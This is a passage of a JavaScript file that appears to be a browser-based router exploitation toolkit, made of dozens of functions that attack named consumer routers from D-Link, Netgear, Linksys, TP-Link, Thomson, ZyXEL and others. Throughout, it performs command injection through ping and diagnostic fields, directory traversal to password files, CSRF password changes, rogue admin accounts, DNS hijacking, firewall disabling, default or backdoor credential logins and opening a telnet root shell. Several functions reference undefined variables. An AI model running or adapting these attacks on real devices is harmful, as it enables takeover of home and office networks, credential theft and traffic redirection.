			    <input	type="hidden"	name="c4_wan_wins_"	value=""/>\
			    <input	type="hidden"	name="h_wan_encapmode"	value="pppoa"/>\
			    <input	type="hidden"	name="h_wan_multiplex"	value="11c"/>\
			    <input	type="hidden"	name="h_pppoa_multiplex"	value="vc"/>\
			    <input	type="hidden"	name="h_wan_qostype"	value="ubr"/>\
			    <input	type="hidden"	name="h_wan_autodetect"	value="enable"/>\
			    <input	type="hidden"	name="h_dsl_modulation"	value="MMODE"/>\
			    <input	type="hidden"	name="h_bridged_dhcpenable"	value="dhcp"/>\
			    <input	type="hidden"	name="h_pppoeDODC"	value="pppoeDODC"/>\
			    <input	type="hidden"	name="h_mtu_type"	value="auto"/>\
			    <input	type="hidden"	name="h_lan_mask"	value="0"/>\
			    <input	type="hidden"	name="h_lan_dhcp"	value="disable"/>\
			    <input	type="hidden"	name="h_time_zone"	value="%2B0+2"/>\
			    <input	type="hidden"	name="h_auto_dls"	value="disable"/>\
			    <input	type="hidden"	name="PppoeUserName"	value=""/>\
			    <input	type="hidden"	name="PppoePasswd"	value=""/>\
			    <input	type="hidden"	name="PppoaUserName"	value="admin"/>\
			    <input	type="hidden"	name="PppoaPasswd"	value="admin"/>\
			    <input	type="hidden"	name="h_ipppoe_enable"	value="0"/>\
			    <input	type="hidden"	name="h_upgrade_langpkt"	value="1"/>\
			    <input	type="hidden"	name="todo"	value="save"/>\
			    <input	type="hidden"	name="this_file"	value="Setup.htm"/>\
			    <input	type="hidden"	name="next_file"	value="Setup.htm"/>\
			    <input	type="hidden"	name="message"	value=""/>\
			    </form>';
			    

	post('http://' + ip + '/setup.cgi', form);
}


// Netgear SPH200D - Directory Traversal
function sph200d_dirtraversal(ip)
{

	ip = ip || "192.168.178.103";
	path = prompt("Path: (ex: /etc/passwd)");
	url = "/../.." + encodeURL(path);
	document.location="http://"+ip+url;	
}

// Alcatel OmniPCX Office 210/061.1 - Remote Command Execution
function omnipcx_commandexec(ip)
{
	cmd = prompt("Command:");
	url = "/cgi-data/FastJSData.cgi?id1=sh2kerr&id2=91|" + encodeURI(cmd);
	document.location="http://"+ip+url;
}

//  DWL-2100AP - Configuration Disclosure
function dwl2100ap_configdisclosure(ip)
{
    ip = ip || "dlink-dwl-2100ap";
    document.location="http://"+ip+"/cgi-bin/Intruders.cfg";
}

// D-Link DSL-2750U - Bypass Auth
function dsl2750u_bypassauth(ip)
{
	ip = ip || "192.168.1.1";
	document.location="http://"+ip+"/html/config";
}

// D-Link DIR-615 D3 - Change Admin Password CSRF
function d615d3_changepass(ip)
{
	ip = ip || "192.168.178.155";
	password = prompt("New Password:");
	url = "/tools_admin.php?ACTION_POST=1&apply=Save+Settings&admin_name=admin&admin_password1=" + pass + "&admin_password2=" + pass + "&grap_auth_enable_h=0&rt_enable=on&rt_enable_h=1&rt_ipaddr=0.0.0.0&rt_port=8080";
	document.location="http://"+ip+url;
}

// Netgear WNDR3400 - Password Disclosure
function wndr3400_disclosure(ip)
{
	ip = ip || "192.168.0.1";
	url = ":8080/unauth.cgi?id=393087602";
	document.location="http://"+ip+url;
}

function dsl2740b_disablemacfilter(ip)
{
	ip = ip || "192.168.1.1";
	var form = '<input	type="hidden"	name="action" value="wlFltMode"/>';
	form += '<input	type="hidden"	name="wlFltMacMode"	value="disabled"/>';
	form += '</form>';
	post('http://' + ip + '/wlmacflt.cmd', form);
}

function dgn1000b_commandexec(ip)
{
	ip = ip || "192.168.178.188";
	cmd = prompt("Command:");
	url = "/setup.cgi?UPnP=UPnP&AdverTime=30&TimeToLive=`%20" + encodeURI(cmd) + "%20`&save=+Anwenden&todo=save&this_file=upnp.htm&next_file=upnp.htm&h_UPnP=enable&hiddenAdverTime=30&hiddenTimeToLive=4";
	document.location="http://"+ip+url;
}
// D-LINK DIR-280 - Change Admin Password
function dir280_changepassword(ip)
{
    ip = ip || "192.168.0.1";
    pwd = prompt("New Password: ");
    form = '<input type="hidden" name="submit-url" value="/tools_admin.asp">\
			<input type="hidden" name="save" value="Apply Changes">\
			<input type="hidden" value="admin" name="adminname">\
			<input type="hidden" value="' + pwd + '" name="newpass">\
			<input type="hidden" value="' + pwd + '" name="confpass">';
			
	form +=	'<input type="hidden" value="0" name="bEnableRomate">\
			 <input type="hidden" value="*" name="RomateIP">\
			 <input type="hidden" value="80" name="RomatePort">\
			 <input type="hidden" value="" name="username">\
			 <input type="hidden" value="" name="userpass">';
	post('http://' + ip + '/goform/formPasswordSetup', form);

}

// D-Link DSL-2740B - Enable Remote Management
function dsl2740b_remote(ip)
{
	ip = ip || "192.168.1.1";
	var form = '<input	type="hidden"	name="action" value="save"/>';
	form += '<input	type="hidden"	name="rmtmode"	value="1"/>';
	form += '<input	type="hidden"	name="rmtport"	value="80"/>';
	form += '<input	type="hidden"	name="rmtaction"	value="allowall"/>';
	form += '<input	type="hidden"	name="ftp"	value="0"/>';
	form += '<input	type="hidden"	name="http"	value="2"/>';
	form += '<input	type="hidden"	name="icmp"	value="2"/>';
	form += '<input	type="hidden"	name="snmp" value="2"/>';
	form += '<input	type="hidden"	name="tftp"	value="0"/>';
	form += '<input	type="hidden"	name="ssh"	value="1"/>';
	form += '<input	type="hidden"	name="telnet"	value="0"/>';
	form += '</form>';
	post('http://' + ip + '/scsrvcntr.cmd', form);
}

// TP-Link TD-8840T - Reset Password 
function td8840t_resetauth(ip)
{
    ip = ip || "192.168.1.1";
    document.location="http://"+ip+"/Forms/tools_admin_1";
    
}

function dsl320b_configdisclosure(ip)
{
    ip = ip || "192.168.178.111";
    document.location="http://"+ip+"/config.bin";
}

// Cisco Linksys E4200 - Directory Traversal
function e4200_dirtraversal(ip)
{

	ip = ip || "192.168.1.254";
	path = prompt("Path: (ex: /etc/passwd)");
	var form = '<input	type="hidden"	name="submit_type" value="nas_admin"/>\
	<input	type="hidden"	name="submit_button"	value="NAS_Adminstration"/>\
	<input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
	<input	type="hidden"	name="next_page"	value="../../../../../../../../../../../../../../../..' + path + '"/></form>';
	post('http://' + ip + '/storage/apply.cgi', form);
	
}

// Linksys E-Series TheMoon Remote Command Injection Exploit
function themoon_remoteexec(ip)
{
	ip = ip || "192.168.1.1";
	cmd = prompt("Command:");
	var form = '<input	type="hidden"	name="change_action"	value=""/>';
	form += '<input	type="hidden"	name="action"	value=""/>';
	form += '<input	type="hidden"	name="commit"	value="0"/>';
	form += '<input	type="hidden"	name="ttcp_num"	value="2"/>';
	form += '<input	type="hidden"	name="ttcp_size"	value="2"/>';
	form += '<input	type="hidden"	name="ttcp_ip"	value="-h"' + encodeURI(cmd);
	form += '"/><input	type="hidden"	name="StartEPI" value="1"/>';
	form += '</form>';
	post('http://' + ip + '/tmUnblock.cgi', form);
}

// Linksys X3000 - OS Command Inyection
function x3000_command(ip)
{
	ip = ip || "192.168.1.1";
	cmd = prompt("Command:");
	var form = '<input	type="hidden"	name="submit_button" value="Diagnostics"/>';
	form += '<input	type="hidden"	name="change_action"	value="gozila_cgi"/>';
	form += '<input	type="hidden"	name="submit_type"	value="start_ping"/>';
	form += '<input	type="hidden"	name="action"	value=""/>';
	form += '<input	type="hidden"	name="commit"	value="0"/>';
	form += '<input	type="hidden"	name="nowait"	value="1"/>';
	form += '<input	type="hidden"	name="ping_ip"	value="%3b"' + encodeURI(cmd);
	form += '%20%3B%26"/><input	type="hidden"	name="ping_size" value=""/>';
	form += '<input	type="hidden"	name="ping_times"	value="5"/>';
	form += '<input	type="hidden"	name="traceroute_ip"	value=""/>';
	form += '</form>';
	post('http://' + ip + '/apply.cgi', form);
}

// Netgear DGN2200 N300 - Remote Command Execution
function dgn2200_commandexec(ip)
{
	ip = ip || "192.168.0.1";
	cmd = prompt("Command:");
	form += '<input	type="hidden"	name="IPAddr1"	value="a"/>';
	form += '<input	type="hidden"	name="IPAddr2"	value="b"/>';
	form += '<input	type="hidden"	name="IPAddr3"	value="c"/>';
	form += '<input	type="hidden"	name="IPAddr4"	value="d"/>';
	form += '<input	type="hidden"	name="ping"	value="xxxx"/>';
	form += '<input	type="hidden"	name="ping_IPAddr"	value="%7C"' + encodeURI(cmd);
	form += '"/>';
	form += '</form>';
	post('http://' + ip + '/ping.cgi', form);
}

// Netgear DGN2200 N300 - Open Telnet
function dgn2200_opentelnet(ip)
{
	ip = ip || "192.168.0.1";
	cmd = "|/usr/sbin/telnetd -p 90 -l /bin/sh"
	form += '<input	type="hidden"	name="IPAddr1"	value="a"/>';
	form += '<input	type="hidden"	name="IPAddr2"	value="b"/>';
	form += '<input	type="hidden"	name="IPAddr3"	value="c"/>';
	form += '<input	type="hidden"	name="IPAddr4"	value="d"/>';
	form += '<input	type="hidden"	name="ping"	value="xxxx"/>';
	form += '<input	type="hidden"	name="ping_IPAddr"	value="%7C"' + encodeURI(cmd);
	form += '"/>';
	form += '</form>';
	post('http://' + ip + '/ping.cgi', form);
}

function wrt160nv2_command(ip)
{
	ip = ip || "192.168.1.1";
	cmd = prompt("Command:");
	var form = '<input	type="hidden"	name="submit_button" value="Diagnostics"/>';
	form += '<input	type="hidden"	name="change_action"	value="gozila_cgi"/>';
	form += '<input	type="hidden"	name="submit_type"	value="start_ping"/>';
	form += '<input	type="hidden"	name="action"	value=""/>';
	form += '<input	type="hidden"	name="commit"	value="0"/>';
	form += '<input	type="hidden"	name="ping_ip"	value="%26"' + encodeURI(cmd);
	form += '%26"/><input	type="hidden"	name="ping_size" value=""/>';
	form += '<input	type="hidden"	name="ping_times"	value="5"/>';
	form += '<input	type="hidden"	name="traceroute_ip"	value=""/>';
	form += '</form>';
	post('http://admin:admin@' + ip + '/apply.cgi', form);
}

// Linksys WRT110 Remote Command Execution
function afterTwoSeconds() {    
    authWindow.close(); 
}

function wrt110_command(ip)
{
	ip = ip || "192.168.1.1";
	cmd = prompt("Command:");
	authURL = "http://admin:admin@" + ip + "/HNAP1/";
	authWindow = window.open(authURL,"_blank","width=100,height=100");
	setTimeout(afterTwoSeconds, 1000); 
	var form = '<input	type="hidden"	name="ping_ip"	value="%26' + encodeURI(cmd) + '"/></form>';
	post('http://admin@admin@' + ip + '/ping.cgi', form);
}



function wr1043nd_dnscsrf(ip)
{
	ip = ip || "192.168.1.1";
	dns_primary = prompt("DNS Primary:");
	dns_secundary = prompt("DNS Secondary:");
	var url = "/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=" + dns_primary + "+&dnsserver2=" + dns_secondary + "&Save=%B1%A3+%B4%E6";
	document.location("http://" + ip + url); 

}

// Cisco EPC3925 - Change Admin Password CSRF
function epc3925_changepassword(ip)
{
    ip = ip || "192.168.0.1";
    pwd = prompt("Password: ");
    form = '<input type="hidden" name="Password" value="attackers_password' + pwd + '"><input type="hidden" name="PasswordReEnter" value="' + pwd +'">\
    <input type="hidden" name="save" value="Save Settings">';
	post('http://' + ip + '/goform/Quick_setup', form);
}

function epc3925_postxss(ip)
{
    ip = ip || "192.168.0.1";
    xss = prompt("XSS Payload: ");
    form = '<input type="hidden" name="DdnsService" value="0">\
	<input type="hidden" name="Username" value="xxx">\
    <input type="hidden" name="DdnsPassword" value="****">\
    <input type="hidden" name="DdnsHostName" value="' + xss + '">\
    <input type="hidden" name="save" value="Save Settings">';
	post('http://' + ip + '/goform/Setup_DDNS', form);

}

// Linksys X3000 - Add Admin Account
function x3000_addadmin(ip)
{
	ip = ip || "192.168.1.1";
	user = prompt("New User:");
	pwd = prompt("New Password");
	var form = '<input	type="hidden"	name="command" value="device_data"/>\
	<input	type="hidden"	name="cur_ipaddr"	value="192.168.178.188"/>\
	<input	type="hidden"	name="next_page"	value="StorageAdminUserAdd1.htm"/>\
	<input	type="hidden"	name="redirect_timer"	value="0"/>\
	<input	type="hidden"	name="reboot"	value="0"/>\
	<input	type="hidden"	name="data1"	value=""/>\
	<input	type="hidden"	name="next_page"	value=""/>\
	<input	type="hidden"	name="submit_button" value="User_Properties"/>\
	<input	type="hidden"	name="submit_type"	value="create_user"/>\
	<input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
	<input	type="hidden"	name="Add_Account_Group_Name"	value=""/>\
	<input	type="hidden"	name="access_group_name"	value=""/>\
	<input	type="hidden"	name="delete_groups"	value=""/>\
	<input	type="hidden"	name="Modify_Account_Name"	value=""/>\
	<input	type="hidden"	name="Add_Account_Name"	value="' + name + '"/>\
	<input	type="hidden"	name="full_name"	value="' + name + '"/>\
	<input	type="hidden"	name="user_desc"	value="' + name + '"/>\
	<input	type="hidden"	name="Add_Account_Password"	value="' + pwd + '"/>\
	<input	type="hidden"	name="Add_Account_PasswordConfirm"	value="' + name +'"/>\
	<input	type="hidden"	name="Add_Account_Group"	value="admin"/>\
	</form>';
	
	post('http://' + ip + '/apply.cgi', form);
}


function freeboxdosr() {
	ip=prompt("IP:");
	document.freeboxdos.action="http://"+ip+"/system.cgi";
	if (ip==null || ip==""){}else{
		document.freeboxdos.submit();
	}
}

// EE BrightBox - Configuration Disclosure
function brightbox_configdisclosure(ip)
{
    ip = ip || "192.168.1.1";
    document.location="http://"+ip+"/cgi/cgi_status.js";
}

function huapppr(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/Listadeparametros.html";
	alert("Continue");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/wanfun.js";
	}
}

function rtn66uexe(){
	ip=prompt("IP:");
	cmd=prompt("Command:");
	img1.src="http://"+ip+"/apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=192.168.1.1&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd="+cmd+"&firmver=3.0.0.4&cmdMethod=ping&destIP=www.google.com&pingCNT=5";
	alert("Continue");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cmdRet_check.htm";
	}
}

function N56Uexe(){
	ip=prompt("IP:");
	cmd=prompt("Command:");
	img1.src="http://"+ip+"/apply.cgi?current_page=Main_AdmStatus_Content.asp&next_page=Main_AdmStatus_Content.asp&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd="+cmd+"&action=Refresh";
	alert("Continue");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/Main_AdmStatus_Content.asp";
	}
}

function huappp(){
	img1.src="http://192.168.1.254/Listadeparametros.html";
	alert("Continue");
	document.location="http://192.168.1.254/wanfun.js";
}

function wireAddHosts() {
	dominio=prompt("Redirect this host:");
	ip=prompt("to this IP:");
	if (ip==null || ip==""){}else{
		document.location="http://home/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
	}
}

function wireAddHostsip() {
	routerip=prompt("Router IP:");
	dominio=prompt("Redirect this host:");
	ip=prompt("to this IP:");
	if (routerip==null || routerip==""){}else{
		document.location="http://"+routerip+"/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
	}
}
function wirecrlfr() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
	document.location="https://"+ip+":50001/xslt?PAGE=%0d%0a";
	}
}
function wirecrlf() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/xslt?PAGE=%0d%0a";
	}
}

function ssDefaultPass() {
	ip=prompt("Remote IP:");
		if (ip==null || ip==""){}else{
	document.location="http://telmex:telmex@"+ip;
	}
}

function thomsondom() {
	dominio=prompt("Redirect this domain:");
	document.thomsondom.dom1.value=dominio;
	dominio2=prompt("to this domain:");
	document.thomsondom.dom2.value=dominio2;
	if (dominio==null || dominio=="" || dominio2==null || dominio2==""){}else{
		document.thomsondom.submit();
	}
}
function thomsonadmin() {
	admin=prompt("Add administrator user(password):");
	document.thomsonadmin.elements[4].value=admin;
	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
	if (admin==null || admin==""){}else{
		document.thomsonadmin.submit();
	}
}

function thomsonadminr() {
	ip=prompt("IP");
	admin=prompt("Add administrator user(password):");
	document.thomsonadmin.elements[4].value=admin;
	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
	if (ip==null || ip==""){}else{
		document.thomsonadmin.submit();
	}
}
function thomsoncall() {
	num=prompt("Call this phone number:");
	document.thomsoncall.elements[1].value=num;
	if (num==null || num==""){}else{
		document.thomsoncall.submit();
	}
}
function thomsondomr() {
	ip=prompt("IP:");
	dominio=prompt("Redirect this domain:");
	document.thomsondom.dom1.value=dominio;
	dominio2=prompt("to this domain:");
	document.thomsondom.dom2.value=dominio2;
	document.thomsondom.action="http://"+ip+"/cgi/b/sfltr/cfg/?be=0&l0=2&l1=5";
	if (ip==null || ip==""){}else{
		document.thomsondom.submit();
	}
}

function thomsoncallr() {
	ip=prompt("IP:");
	num=prompt("Call this phone number:");
	document.thomsoncall.elements[1].value=num;
	document.thomsoncall.action="http://"+ip+"/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=";
	if (ip==null || ip==""){}else{
		document.thomsoncall.submit();
	}
}
function btra() {
	pass=prompt("Change tech password to:");
	document.btra.elements[2].value=pass;
	if (pass==null || pass==""){}else{
		document.btra.submit();
	}
}
function btrar() {
	ip=prompt("IP:");
	pass=prompt("Change tech password to:");
	document.btra.elements[2].value=pass;
	document.btra.action="http://"+ip+"/cgi/b/ras//?ce=1&be=1&l0=5&l1=5";
	if (ip==null || ip==""){}else{
		document.btra.submit();
	}
}
function btwifir() {
	ip=prompt("IP:");
	document.btwifi.action="http://"+ip+"/cgi/b/_wli_/cfg//";
	if (ip==null || ip==""){}else{
		document.btwifi.submit();
	}
}
function mt880admin() {
	admin=prompt("Add administrator user(password):");
	if (admin==null || admin==""){}else{
		document.location="http://admin:admin@192.168.1.1/Action?user_id="+admin+"&priv=1&pass1="+admin+"&pass2="+admin+"&id=70";
	}
}
function mt880adminr() {
	ip=prompt("IP:");
	admin=prompt("Add administrator user(password):");
	if (ip==null || ip==""){}else{
		document.location="http://admin:admin@"+ip+"/Action?user_id="+admin+"&priv=1&pass1="+admin+"&pass2="+admin+"&id=70";
	}
}

function dc227backdoor() {
	ip=prompt("IP:");
	document.location="http://adsl:epicrouter2007@"+ip;
}

function dsl2740b_disablefirewall(ip)
{
	ip = ip || "192.168.1.1";
	var form = '<input	type="hidden"	name="fwFlag" value="521472"/>';
	form += '<input	type="hidden"	name="dosenbl"	value="0"/>';
	form += '</form>';
	post('http://' + ip + '/scdmz.cmd', form);
}

function mt880fw() {
	ip=prompt("IP:");
	admin=prompt("Add administrator user(password):");
	if (ip==null || ip==""){}else{
		document.location="http://admin:admin@"+ip+"/Action?blacklisting_status=1&bl_list=10&attack_status=0&dos_status=0&id=42&max_tcp=25&max_icmp=25&max_host=70";
	}
}

function airoscmd() {
	cmd=prompt("Command:");
	if (cmd==null || cmd==""){}else{
		document.location="http://192.168.1.1/stainfo.cgi?ifname=eth0;"+cmd;
	}
}

function airoscmdr() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/stainfo.cgi?ifname=eth0;"+cmd;
	}
}


function comcommand() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/utility.cgi?testType=1&IP=aaa || "+cmd;
	}
}
function comcommandl() {
	ip="192.168.1.1";
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/utility.cgi?testType=1&IP=aaa || "+cmd;
	}
}

function belkindns() {
	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
	dns3=prompt("DNS IP ("+dns1+"."+dns2+".???.XXX):");
	dns4=prompt("DNS IP ("+dns1+"."+dns2+"."+dns3+".???):");
	document.belkindns.dns1_1.value=dns1;
	document.belkindns.dns1_2.value=dns2;
	document.belkindns.dns1_3.value=dns3;
	document.belkindns.dns1_4.value=dns4;
	document.belkindns.dns2_1.value=dns1;
	document.belkindns.dns2_2.value=dns2;
	document.belkindns.dns2_3.value=dns3;
	document.belkindns.dns2_4.value=dns4;
	if (dns1==null || dns1==""){}else{
		document.belkindns.submit();
	}
}

function belkindnsr() {
	ip=prompt("IP:");
	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
	dns3=prompt("DNS IP ("+dns1+"."+dns2+".???.XXX):");
	dns4=prompt("DNS IP ("+dns1+"."+dns2+"."+dns3+".???):");
	document.belkindns.dns1_1.value=dns1;
	document.belkindns.dns1_2.value=dns2;
	document.belkindns.dns1_3.value=dns3;
	document.belkindns.dns1_4.value=dns4;
	document.belkindns.dns2_1.value=dns1;
	document.belkindns.dns2_2.value=dns2;
	document.belkindns.dns2_3.value=dns3;
	document.belkindns.dns2_4.value=dns4;
	document.belkindns.action="http://"+ip+"/cgi-bin/setup_dns.exe";
	if (ip==null || ip==""){}else{
		document.belkindns.submit();
	}
}

function belkinrest() {
	ip=prompt("IP:");
	document.belkinrest.action="http://"+ip+"/cgi-bin/setup_dns.exe";
	if (ip==null || ip==""){}else{
		document.belkinrest.submit();
	}
}

function tF() {
	ip=prompt("IP:");
	document.tF.action="http://"+ip+"/cgi-bin/login.exe";
	if (ip==null || ip==""){}else{
		document.tF.submit();
	}
}

function wrtadmin() {
	admin=prompt("Change administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	document.wrtadmin.http_passwdConfirm.value=admin;
	if (ip==null || ip==""){}else{
		document.wrtadmin.submit();
	}
}
// TP-Link WDR740ND/WDR740N - Directory Traversal
function wdr740_dirtraversal(ip)
{

	ip = ip || "192.168.1.254";
	path = prompt("Path: (ex: /etc/shadow)");
	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
}

// D-Link DIR-615 D3 - Remote Command Execution
function d615d3_commandexec(ip)
{
	ip = ip || "192.168.178.155";
	cmd = prompt("Command:");
	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20` " + cmd + "` ";
	document.location="http://"+ip+url;
}

function wrtadminr() {
	ip=prompt("IP:");
	document.wrtadmin.action="http://"+ip+"/manage.tri";
	admin=prompt("Change administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	document.wrtadmin.http_passwdConfirm.value=admin;
	if (ip==null || ip==""){}else{
		document.wrtadmin.submit();
	}
}
function wag120pass() {
	admin=prompt("Change administrator password:");
	document.wag120pass.sysPasswd.value=admin;
	document.wag120pass.sysConfirmPasswd.value=admin;
	if (admin==null || admin==""){}else{
		document.wag120pass.submit();
	}
}
function sagem2604() {
	admin=prompt("Change administrator password:");
	document.sagem2604.sysPasswd.value=admin;
	if (admin==null || admin==""){}else{
		document.sagem2604.submit();
	}
}
function sagem2604r() {
	ip=prompt("IP:");
	document.sagem2604.action="http://"+ip+"/password.cgi";
	admin=prompt("Add administrator password:");
	document.sagem2604.sysPasswd.value=admin;
	if (ip==null || ip==""){}else{
		document.sagem2604.submit();
	}
}
function wag120add() {
	user=prompt("Add administrator username:");
	document.wag120add.sysname.value=user;
	admin=prompt("Add administrator password:");
	document.wag120add.sysPasswd.value=admin;
	document.wag120add.sysConfirmPasswd.value=admin;
	if (user==null || user==""){}else{
		document.wag120add.submit();
	}
}
function wag120passr() {
	ip=prompt("IP:");
	document.wag120pass.action="http://"+ip+"/setup.cgi";
	admin=prompt("Change administrator password:");
	document.wag120pass.sysPasswd.value=admin;
	document.wag120pass.sysConfirmPasswd.value=admin;
	if (ip==null || ip==""){}else{
		document.wag120pass.submit();
	}
}
function wag120addr() {
	ip=prompt("IP:");
	document.wag120add.action="http://"+ip+"/setup.cgi";
	user=prompt("Add administrator username:");
	document.wag120add.sysname.value=user;
	admin=prompt("Add administrator password:");
	document.wag120add.sysPasswd.value=admin;
	document.wag120add.sysConfirmPasswd.value=admin;
	if (ip==null || ip==""){}else{
		document.wag120add.submit();
	}
}
function wrtradmin() { //fixed. thnx lightos
	admin=prompt("Set administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	port=prompt("Remote interface on port:");
	document.wrtadmin.http_wanport.value=port;
	document.wrtadmin.remote_management.value="1";
	if (admin==null || admin==""){}else{
		document.wrtadmin.submit();
	}
}
function wrtradminr() {
	ip=prompt("IP:");
	document.wrtadmin.action="http://"+ip+"/manage.tri";
	admin=prompt("Set administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	port=prompt("Remote interface on port:");
	document.wrtadmin.http_wanport.value=port;
	document.wrtadmin.remote_management.value="1";
	if (ip==null || ip==""){}else{
		document.wrtadmin.submit();
	}
}
function wrtdefault() {
	ip=prompt("IP:");
	document.wrtdefault.action="http://"+ip+"/factdefa.tri";
	if (ip==null || ip==""){}else{
		document.wrtdefault.submit();
	}
}
function wrtwifi() {
	ip=prompt("IP:");
	document.wrtwifi.action="http://"+ip+"/Security.tri";
	if (ip==null || ip==""){}else{
		document.wrtwifi.submit();
	}
}

function wbrpass() {
	admin=prompt("New password:");
	if (admin==null || admin==""){}else{
		document.location="http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
	}
}

function dirpass() {
	admin=prompt("New password:");
	if (admin==null || admin==""){}else{
		document.location="http://192.168.0.1/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
	}
}

function dirpassr() {
	ip=prompt("IP:");
	admin=prompt("New password:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
	}
}

function dsltpass() {
	alert("Reseting password admin:password");
	document.dsltpass.submit();
}

function dsltpassr() {
	ip=prompt("IP:");
	alert("Reseting password admin:password");
	document.dsltpass.action="http://"+ip+"/cgi-bin/webcm";
	if (ip==null || ip==""){}else{
		document.dsltpass.submit();
	}
}

function DSL2640B() {
	ip=prompt("IP:");
	pass=prompt("Password:");
	document.dsl2640.action="http://192.168.1.1:80/redpass.cgi?sysPassword="+pass+"&change=1";
	if (ip==null || ip==""){}else{
		document.dsl2640.submit();
	}
}

function DSL2640Br() {
	ip=prompt("IP:");
	pass=prompt("Password:");
	document.dsl2640.action="http://"+ip+":80/redpass.cgi?sysPassword="+pass+"&change=1";
	if (ip==null || ip==""){}else{
		document.dsl2640.submit();
	}
}

function ff2640U(){
	ip=prompt("IP:");
	document.f2640U.action="http://"+ip+"/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0";
	if (ip==null || ip==""){}else{
		document.f2640U.submit();
	}
}

function  ff1500WG(){
	ip=prompt("IP:");
	document.f1500WG.action="http://"+ip+"/m_atminttemp11.stm";
	if (ip==null || ip==""){}else{
		document.f1500WG.submit();
	}
}

function singwiredosr() {
	ip=prompt("IP:");
	document.singwiredos.action="http://"+ip+"/xslt";
	if (ip==null || ip==""){}else{
		document.singwiredos.submit();
	}
}

function wbrpassr() {
	ip=prompt("IP:");
	admin=prompt("New password:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
	}
}
function setipadminadmin() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://admin:admin@"+ip;
	}
}
function zyxelxss() {
	dom=prompt("Domain:");
	document.zyxelxss.sysDomainname.value=dom;
	xss=getxss();
	document.zyxelxss.sysSystemname.value=xss;
	if (dom==null || dom==""){}else{
		document.zyxelxss.submit();
	}
}
function zyxelxssp() {
	xss=getxss();
	document.zyxelxssp.PortRule_Name.value=xss;
	if (xss==null || xss==""){}else{
		document.zyxelxssp.submit();
	}
}
function zyxelxsspr() {
	xss=getxss();
	document.zyxelxssp.PortRule_Name.value=xss;
	if (xss==null || Xss==""){}else{
		document.zyxelxssp.submit();
	}
}
function zyxelxssr() {
	ip=prompt("IP:");
	dom=prompt("Domain:");
	document.zyxelxss.sysDomainname.value=dom;
	xss=getxss();
	document.zyxelxss.sysSystemname.value=xss;
	document.zyxelxss.action="http://"+ip+"/forms/General_1";
	if (ip==null || ip==""){}else{
		document.zyxelxss.submit();
	}
}
function zyxeldefault() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://user:1234@"+ip;
	}
}
function shodan() {
	q=prompt("Search:");
	if (q==null || q==""){}else{
		document.location="http://www.shodanhq.com/?q="+q;
	}
}

function macfind() {
	q=prompt("AP MAC:");
	if (q==null || q==""){}else{
		document.location="http://www.coffer.com/mac_find/?string="+q;
	}
}

function isnaaa(){
	ip=prompt("Flexi-ISN IP:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cgi-bin/aaa.tcl?";
	}
}
function isnagr(){
	ip=prompt("Flexi-ISN IP:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cgi-bin/aggr_config.tcl?";
	}
}
function isnggs(){
	ip=prompt("Flexi-ISN IP:");
	if (ip==null || ip==""){}else{
